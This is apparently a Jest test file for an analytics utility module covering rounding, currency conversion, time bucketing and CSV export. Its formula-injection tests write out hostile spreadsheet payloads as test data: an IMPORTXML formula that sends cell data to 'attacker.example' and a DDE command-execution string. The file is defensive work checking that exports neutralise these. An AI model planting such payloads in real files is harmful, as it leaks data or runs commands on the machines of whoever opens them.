import {
  round2,
  pct,
  rupeesToPaise,
  granularityToSqlUnit,
  truncateToBucket,
  stepBucket,
  enumerateBuckets,
  fillTimeSeries,
  toCsv,
} from './analytics.util';
import { Granularity } from './dto';

describe('analytics.util', () => {
  describe('round2', () => {
    it('rounds to 2 decimals', () => {
      expect(round2(33.33333)).toBe(33.33);
      expect(round2(0.005)).toBe(0.01);
      expect(round2(10)).toBe(10);
    });
  });

  describe('pct', () => {
    it('computes a 2dp percentage', () => {
      expect(pct(1, 3)).toBe(33.33);
      expect(pct(80, 100)).toBe(80);
    });

    it('never divides by zero', () => {
      expect(pct(5, 0)).toBe(0);
      expect(pct(0, 0)).toBe(0);
      expect(pct(5, -1)).toBe(0);
    });
  });

  describe('rupeesToPaise', () => {
    it('converts rupees to integer paise', () => {
      expect(rupeesToPaise(1500.5)).toBe(150050);
      expect(rupeesToPaise(0)).toBe(0);
      expect(rupeesToPaise(99.99)).toBe(9999);
    });

    it('rounds away floating-point dust', () => {
      // 19.99 * 100 = 1998.9999999... in IEEE-754
      expect(rupeesToPaise(19.99)).toBe(1999);
    });
  });

  describe('granularityToSqlUnit', () => {
    it('maps each granularity to a date_trunc unit', () => {
      expect(granularityToSqlUnit(Granularity.HOUR)).toBe('hour');
      expect(granularityToSqlUnit(Granularity.DAY)).toBe('day');
      expect(granularityToSqlUnit(Granularity.WEEK)).toBe('week');
      expect(granularityToSqlUnit(Granularity.MONTH)).toBe('month');
    });
  });

  describe('truncateToBucket', () => {
    it('truncates to the start of the UTC day', () => {
      const d = new Date('2026-06-15T13:45:30.000Z');
      expect(truncateToBucket(d, Granularity.DAY).toISOString()).toBe('2026-06-15T00:00:00.000Z');
    });

    it('truncates to the start of the UTC hour', () => {
      const d = new Date('2026-06-15T13:45:30.000Z');
      expect(truncateToBucket(d, Granularity.HOUR).toISOString()).toBe('2026-06-15T13:00:00.000Z');
    });

    it('anchors weeks on Monday (matching Postgres date_trunc)', () => {
      // 2026-06-15 is a Monday; 2026-06-17 (Wed) truncates back to it.
      const wed = new Date('2026-06-17T10:00:00.000Z');
      expect(truncateToBucket(wed, Granularity.WEEK).toISOString()).toBe(
        '2026-06-15T00:00:00.000Z',
      );
      // A Sunday belongs to the week starting the prior Monday.
      const sun = new Date('2026-06-21T23:00:00.000Z');
      expect(truncateToBucket(sun, Granularity.WEEK).toISOString()).toBe(
        '2026-06-15T00:00:00.000Z',
      );
    });

    it('truncates to the first of the UTC month', () => {
      const d = new Date('2026-06-15T13:45:30.000Z');
      expect(truncateToBucket(d, Granularity.MONTH).toISOString()).toBe(
        '2026-06-01T00:00:00.000Z',
      );
    });
  });

  describe('stepBucket', () => {
    it('advances by one bucket per granularity', () => {
      const base = new Date('2026-06-01T00:00:00.000Z');
      expect(stepBucket(base, Granularity.HOUR).toISOString()).toBe('2026-06-01T01:00:00.000Z');
      expect(stepBucket(base, Granularity.DAY).toISOString()).toBe('2026-06-02T00:00:00.000Z');
      expect(stepBucket(base, Granularity.WEEK).toISOString()).toBe('2026-06-08T00:00:00.000Z');
      expect(stepBucket(base, Granularity.MONTH).toISOString()).toBe('2026-07-01T00:00:00.000Z');
    });
  });

  describe('enumerateBuckets', () => {
    it('enumerates every daily bucket inclusive of the end bucket', () => {
      const from = new Date('2026-06-01T06:00:00.000Z');
      const to = new Date('2026-06-03T18:00:00.000Z');
      const buckets = enumerateBuckets(from, to, Granularity.DAY);
      expect(buckets.map((b) => b.toISOString())).toEqual([
        '2026-06-01T00:00:00.000Z',
        '2026-06-02T00:00:00.000Z',
        '2026-06-03T00:00:00.000Z',
      ]);
    });

    it('produces a single bucket when from and to share one bucket', () => {
      const from = new Date('2026-06-01T01:00:00.000Z');
      const to = new Date('2026-06-01T05:00:00.000Z');
      expect(enumerateBuckets(from, to, Granularity.DAY)).toHaveLength(1);
    });
  });

  describe('fillTimeSeries', () => {
    it('fills gaps with zero and keeps real values', () => {
      const from = new Date('2026-06-01T00:00:00.000Z');
      const to = new Date('2026-06-03T00:00:00.000Z');
      const rows = [{ bucket: new Date('2026-06-02T09:00:00.000Z'), value: 5 }];

      const series = fillTimeSeries(from, to, Granularity.DAY, rows);

      expect(series).toEqual([
        { date: '2026-06-01T00:00:00.000Z', value: 0 },
        { date: '2026-06-02T00:00:00.000Z', value: 5 },
        { date: '2026-06-03T00:00:00.000Z', value: 0 },
      ]);
    });

    it('aggregates multiple rows landing in the same bucket', () => {
      const from = new Date('2026-06-01T00:00:00.000Z');
      const to = new Date('2026-06-01T23:00:00.000Z');
      const rows = [
        { bucket: new Date('2026-06-01T02:00:00.000Z'), value: 3 },
        { bucket: new Date('2026-06-01T20:00:00.000Z'), value: 4 },
      ];

      const series = fillTimeSeries(from, to, Granularity.DAY, rows);
      expect(series).toEqual([{ date: '2026-06-01T00:00:00.000Z', value: 7 }]);
    });

    it('rounds filled values to 2 decimals', () => {
      const from = new Date('2026-06-01T00:00:00.000Z');
      const to = new Date('2026-06-01T01:00:00.000Z');
      const rows = [{ bucket: new Date('2026-06-01T00:30:00.000Z'), value: 33.33333 }];
      const series = fillTimeSeries(from, to, Granularity.HOUR, rows);
      expect(series[0]!.value).toBe(33.33);
    });
  });

  describe('toCsv', () => {
    it('returns an empty string for no rows', () => {
      expect(toCsv([])).toBe('');
    });

    it('renders a header row from the first row\'s keys, then one row per entry', () => {
      const csv = toCsv([
        { date: '2026-06-01', conversations: 3 },
        { date: '2026-06-02', conversations: 5 },
      ]);
      expect(csv).toBe('date,conversations\r\n2026-06-01,3\r\n2026-06-02,5');
    });

    it('quotes values containing commas, quotes, or newlines and doubles internal quotes', () => {
      const csv = toCsv([{ name: 'Say "hi", please\nthanks' }]);
      expect(csv).toBe('name\r\n"Say ""hi"", please\nthanks"');
    });

    it('renders null as an empty field', () => {
      const csv = toCsv([{ note: null }]);
      expect(csv).toBe('note\r\n');
    });

    /**
     * Spreadsheet formula injection. The export is a file a human opens in
     * Excel or Sheets, and those evaluate a leading =, +, -, @, tab or CR as a
     * formula — inside RFC 4180 quotes just the same, so quoting is not the
     * defence. A staff-export row carries a team member's own display name.
     */
    describe('formula injection', () => {
      const csvBody = (value: string) => toCsv([{ name: value }]).split('\r\n')[1];

      it.each(['=', '+', '-', '@', '\t', '\r'])(
        'neutralises a cell starting with %j',
        (trigger) => {
          expect(csvBody(`${trigger}1+1`)).toContain(`'${trigger}1+1`);
        },
      );

      it('defuses a data-exfiltrating IMPORTXML payload', () => {
        const payload = '=IMPORTXML(CONCAT("https://attacker.example/?d=",A2),"//a")';
        const body = csvBody(payload);

        // The apostrophe must come before the '=', or the cell still evaluates.
        expect(body!.startsWith("\"'=IMPORTXML") || body!.startsWith("'=IMPORTXML")).toBe(true);
        expect(body).not.toMatch(/(^|,)=IMPORTXML/);
      });

      it('defuses the DDE command-execution form', () => {
        expect(csvBody('=cmd|\'/c calc\'!A1')).toContain("'=cmd");
      });

      it('still quotes a neutralised value that also contains a comma', () => {
        // Both defences have to apply; neither may cancel the other out.
        expect(csvBody('=A1,B1')).toBe('"\'=A1,B1"');
      });

      it('neutralises a header key too', () => {
        // Headers come from row keys, which the staff export builds, but a
        // formula reaching row 1 would be just as live as one in row 2.
        expect(toCsv([{ '=evil()': 1 }]).split('\r\n')[0]).toBe("'=evil()");
      });

      it('leaves ordinary text untouched', () => {
        expect(csvBody('Priya Sharma')).toBe('Priya Sharma');
        expect(csvBody('2026-06-01')).toBe('2026-06-01');
      });

      /**
       * Numeric cells are built by this codebase, never by a user, so a
       * negative number must stay a number — prefixing it would turn a revenue
       * column into text and break every consumer downstream.
       */
      it('leaves a negative number as a number', () => {
        expect(toCsv([{ deltaPaise: -500 }])).toBe('deltaPaise\r\n-500');
      });

      it('leaves an empty string and a false boolean alone', () => {
        expect(toCsv([{ a: '', b: false }])).toBe('a,b\r\n,false');
      });
    });
  });
});
